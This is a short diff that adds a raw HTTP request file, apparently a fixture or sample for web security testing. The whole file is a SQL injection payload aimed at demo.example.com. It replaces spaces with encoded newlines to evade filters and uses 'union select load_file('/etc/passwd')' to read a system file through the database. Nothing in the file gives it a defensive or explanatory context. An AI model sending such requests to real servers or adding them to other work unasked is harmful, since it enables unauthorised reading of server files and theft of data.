@@ -1,0 +1,4 @@
+GET /a?input=1%0aunion%0aselect%0aload_file('/etc/passwd') HTTP/1.1
+Host: demo.example.com
+Connection: close
+
